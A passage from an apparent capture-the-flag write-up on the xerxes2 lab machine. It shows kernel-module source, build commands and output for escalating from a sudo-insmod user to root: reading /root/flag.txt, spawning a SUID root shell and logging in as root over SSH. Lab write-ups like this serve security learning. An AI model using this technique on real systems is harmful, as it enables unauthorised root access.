<p>Korenchkin can load and remove kernel modules as root without a password. This could be interesting as I have no idea about how kernel modules work. I started off compiling and loading a simple Hello World module from <a href="http://www.thegeekstuff.com/2013/07/write-linux-kernel-module/">TheGeekStuff</a>. It worked ! But can I make a malicious kernel module - possibly one that can read /root/flag.txt ? Yup, and here&rsquo;s the code to do it.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;linux/module.h&gt;  </span><span class="c1">// Needed by all modules</span>
</span><span class='line'><span class="cp">#include &lt;linux/kernel.h&gt;  </span><span class="c1">// Needed for KERN_INFO</span>
</span><span class='line'><span class="cp">#include &lt;linux/fs.h&gt;      </span><span class="c1">// Needed by filp</span>
</span><span class='line'><span class="cp">#include &lt;asm/uaccess.h&gt;   </span><span class="c1">// Needed by segment descriptors</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">init_module</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">// Create variables</span>
</span><span class='line'>    <span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">mm_segment_t</span> <span class="n">fs</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// Init the buffer with 0</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="n">i</span><span class="o">&lt;</span><span class="mi">1024</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>        <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// To see in /var/log/messages that the module is operating</span>
</span><span class='line'>    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&quot;My module is loaded</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// I am using Fedora and for the test I have chosen following file</span>
</span><span class='line'>    <span class="c1">// Obviously it is much smaller than the 128 bytes, but hell with it =)</span>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="n">filp_open</span><span class="p">(</span><span class="s">&quot;/root/flag.txt&quot;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span><span class='line'>        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_ALERT</span> <span class="s">&quot;filp_open error!!.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="c1">// Get current segment descriptor</span>
</span><span class='line'>        <span class="n">fs</span> <span class="o">=</span> <span class="n">get_fs</span><span class="p">();</span>
</span><span class='line'>        <span class="c1">// Set segment descriptor associated to kernel space</span>
</span><span class='line'>        <span class="n">set_fs</span><span class="p">(</span><span class="n">get_ds</span><span class="p">());</span>
</span><span class='line'>        <span class="c1">// Read the file</span>
</span><span class='line'>        <span class="n">f</span><span class="o">-&gt;</span><span class="n">f_op</span><span class="o">-&gt;</span><span class="n">read</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">f_pos</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// Restore segment descriptor</span>
</span><span class='line'>        <span class="n">set_fs</span><span class="p">(</span><span class="n">fs</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// See what we read from file</span>
</span><span class='line'>        <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&quot;buf:%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">filp_close</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">cleanup_module</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">&quot;My module is unloaded</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I realised I needed a Makefile as well, so I knocked one of those up quickly (nothing complicated)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>obj-m += flag.o
</span><span class='line'>
</span><span class='line'>all:
</span><span class='line'>    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
</span><span class='line'>
</span><span class='line'>clean:
</span><span class='line'>    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
</span></code></pre></td></tr></table></div></figure>


<p>With the source code and the Makefile, I then compiled the kernel module and loaded it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4<span class="nv">$ </span>make -C /lib/modules/<span class="k">$(</span>uname -r<span class="k">)</span>/build <span class="nv">M</span><span class="o">=</span>/home/korenchkin/kernel/kernel2/kernel3/kernel4 modules
</span><span class='line'>make: Entering directory <span class="sb">`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span class="s1">&#39;</span>
</span><span class='line'><span class="s1">  CC [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.o</span>
</span><span class='line'><span class="s1">/home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c: In function ‘init_module’:</span>
</span><span class='line'><span class="s1">/home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.c:37:1: warning: the frame size of 1028 bytes is larger than 1024 bytes [-Wframe-larger-than=]</span>
</span><span class='line'><span class="s1">  Building modules, stage 2.</span>
</span><span class='line'><span class="s1">  MODPOST 1 modules</span>
</span><span class='line'><span class="s1">  CC      /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.mod.o</span>
</span><span class='line'><span class="s1">  LD [M]  /home/korenchkin/kernel/kernel2/kernel3/kernel4/flag2.ko</span>
</span><span class='line'><span class="s1">make: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;</span>
</span><span class='line'>You have new mail in /var/mail/korenchkin
</span><span class='line'>korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4<span class="nv">$ </span>sudo insmod flag2.ko
</span><span class='line'>korenchkin@xerxes2:~/kernel/kernel2/kernel3/kernel4<span class="nv">$ </span>dmesg <span class="p">|</span> tail -20
</span><span class='line'><span class="o">[</span>113593.419616<span class="o">]</span> <span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'><span class="o">[</span>113593.419617<span class="o">]</span>  <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'><span class="o">[</span>113593.419618<span class="o">]</span>   <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
</span><span class='line'><span class="s1">[113593.419619]    `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'><span class="o">[</span>113593.419619<span class="o">]</span>    d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
</span><span class='line'><span class="s1">[113593.419620]   d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'><span class="o">[</span>113593.419621<span class="o">]</span> _d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'><span class="o">[</span>113593.419622<span class="o">]</span>
</span><span class='line'><span class="o">[</span>113593.419622<span class="o">]</span>     congratulations on beating xerxes2!
</span><span class='line'><span class="o">[</span>113593.419623<span class="o">]</span>
</span><span class='line'><span class="o">[</span>113593.419623<span class="o">]</span>     I hope you enjoyed it as much as I did making xerxes2.
</span><span class='line'><span class="o">[</span>113593.419624<span class="o">]</span>     xerxes1 has been described as <span class="s1">&#39;weird&#39;</span> and <span class="s1">&#39;left-field&#39;</span>
</span><span class='line'><span class="o">[</span>113593.419625<span class="o">]</span>     and I hope that this one fits that description too :<span class="o">)</span>
</span><span class='line'><span class="o">[</span>113593.419625<span class="o">]</span>
</span><span class='line'><span class="o">[</span>113593.419626<span class="o">]</span>     Many thanks to @TheColonial <span class="p">&amp;</span> @rasta_mouse <span class="k">for</span> testing!
</span><span class='line'><span class="o">[</span>113593.419626<span class="o">]</span>
</span><span class='line'><span class="o">[</span>113593.419627<span class="o">]</span>     Ping me on <span class="c">#vulnhub for thoughts and comments!</span>
</span><span class='line'><span class="o">[</span>113593.419627<span class="o">]</span>
</span><span class='line'><span class="o">[</span>113593.419628<span class="o">]</span>                       @barrebas, July 2014
</span><span class='line'><span class="o">[</span>113593.419628<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So, most people would go &ldquo;I GOT THE FLAG !&rdquo; and do a little dance. Probably along these lines</p>

<p><img src="http://24.media.tumblr.com/d84096090e0740e9a0f9c91e94277f5a/tumblr_n411lwkMIO1qi4zmno1_500.gif" alt="" /></p>

<p>But I wanted more - I actually wanted a root shell. I wonder if I can run shell scripts with a kernel module. Hmm&hellip; google ? I was drawn to <a href="http://people.ee.ethz.ch/~arkeller/linux/kernel_user_space_howto.html">this article</a> which provided the following code</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;linux/module.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/kernel.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/init.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/proc_fs.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;asm/uaccess.h&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">usermodehelper_example_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;/home/arkeller/eth/paper/code/callee&quot;</span><span class="p">,</span> <span class="s">&quot;2&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;HOME=/&quot;</span><span class="p">,</span> <span class="s">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printk</span><span class="p">(</span><span class="s">&quot;usermodehelper: init</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="cm">/* last parameter: 1 -&gt; wait until execution has finished, 0 go ahead without waiting*/</span>
</span><span class='line'>  <span class="cm">/* returns 0 if usermode process was started successfully, errorvalue otherwise*/</span>
</span><span class='line'>  <span class="cm">/* no possiblity to get return value of usermode process*/</span>
</span><span class='line'>  <span class="n">ret</span> <span class="o">=</span> <span class="n">call_usermodehelper</span><span class="p">(</span><span class="s">&quot;/home/arkeller/eth/paper/code/callee&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">UMH_WAIT_EXEC</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">printk</span><span class="p">(</span><span class="s">&quot;error in call to usermodehelper: %i</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>      <span class="n">printk</span><span class="p">(</span><span class="s">&quot;everything all right</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">usermodehelper_example_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printk</span><span class="p">(</span><span class="s">&quot;usermodehelper: exit</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">module_init</span><span class="p">(</span><span class="n">usermodehelper_example_init</span><span class="p">);</span>
</span><span class='line'><span class="n">module_exit</span><span class="p">(</span><span class="n">usermodehelper_example_exit</span><span class="p">);</span>
</span><span class='line'><span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">&quot;GPL&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m on the home straight here - lets modify this code to run a shell script instead (the shell script used is identical to that used earlier to get from delacroix to polito).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;linux/module.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/kernel.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/init.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;linux/proc_fs.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;asm/uaccess.h&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">usermodehelper_example_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;/home/korenchkin/runme.sh&quot;</span><span class="p">,</span> <span class="s">&quot;2&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span><span class='line'>        <span class="kt">char</span> <span class="o">*</span><span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&quot;HOME=/&quot;</span><span class="p">,</span> <span class="s">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">printk</span><span class="p">(</span><span class="s">&quot;usermodehelper: init</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="cm">/* last parameter: 1 -&gt; wait until execution has finished, 0 go ahead without waiting*/</span>
</span><span class='line'>        <span class="cm">/* returns 0 if usermode process was started successfully, errorvalue otherwise*/</span>
</span><span class='line'>        <span class="cm">/* no possiblity to get return value of usermode process*/</span>
</span><span class='line'>        <span class="n">ret</span> <span class="o">=</span> <span class="n">call_usermodehelper</span><span class="p">(</span><span class="s">&quot;/home/korenchkin/runme.sh&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">UMH_WAIT_EXEC</span><span class="p">);</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>                <span class="n">printk</span><span class="p">(</span><span class="s">&quot;error in call to usermodehelper: %i</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
</span><span class='line'>        <span class="k">else</span>
</span><span class='line'>                <span class="n">printk</span><span class="p">(</span><span class="s">&quot;everything all right</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">usermodehelper_example_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="n">printk</span><span class="p">(</span><span class="s">&quot;usermodehelper: exit</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">module_init</span><span class="p">(</span><span class="n">usermodehelper_example_init</span><span class="p">);</span>
</span><span class='line'><span class="n">module_exit</span><span class="p">(</span><span class="n">usermodehelper_example_exit</span><span class="p">);</span>
</span><span class='line'><span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">&quot;GPL&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>I created another Makefile, compiled the module and loaded it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>make -C /lib/modules/<span class="k">$(</span>uname -r<span class="k">)</span>/build <span class="nv">M</span><span class="o">=</span>/home/korenchkin/a modules
</span><span class='line'>make: Entering directory <span class="sb">`</span>/usr/src/linux-headers-3.2.0-4-686-pae<span class="s1">&#39;</span>
</span><span class='line'><span class="s1">  CC [M]  /home/korenchkin/a/a.o</span>
</span><span class='line'><span class="s1">  Building modules, stage 2.</span>
</span><span class='line'><span class="s1">  MODPOST 1 modules</span>
</span><span class='line'><span class="s1">  CC      /home/korenchkin/a/a.mod.o</span>
</span><span class='line'><span class="s1">  LD [M]  /home/korenchkin/a/a.ko</span>
</span><span class='line'><span class="s1">make: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;</span>
</span><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>sudo insmod a.ko
</span><span class='line'>korenchkin@xerxes2:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://media.giphy.com/media/DUuyU3KyYGLNS/giphy.gif" alt="" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>korenchkin@xerxes2:~<span class="nv">$ </span>ls -l /tmp
</span><span class='line'>total 244
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> delacroix delacroix    <span class="m">55</span> Aug  <span class="m">6</span> 16:15 123.sh
</span><span class='line'>-rwsrwxrwx <span class="m">1</span> root      root      <span class="m">97284</span> Aug  <span class="m">8</span> 03:40 rootshell
</span><span class='line'>-rwsrwxrwx <span class="m">1</span> polito    polito    <span class="m">97284</span> Aug  <span class="m">6</span> 16:15 shell
</span><span class='line'>korenchkin@xerxes2:~/a<span class="nv">$ </span>/tmp/rootshell
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>korenchkin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>korenchkin<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>korenchkin<span class="o">)</span>
</span><span class='line'><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<p>Well, what do you know - a binary owned by root with the SUID attribute set that drops us to a root shell. I&rsquo;ll echo my SSH key into authorized_keys for completeness, and SSH in as root and cat the /root/flag.txt file</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh root@192.168.0.102
</span><span class='line'>
</span><span class='line'>Welcome to xerxes2.
</span><span class='line'>      XERXES wishes you
</span><span class='line'>       a pleasant stay.
</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM </span>
</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;    </span>
</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>root@xerxes2:~# id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span><span class='line'>root@xerxes2:~# cat flag.txt
</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
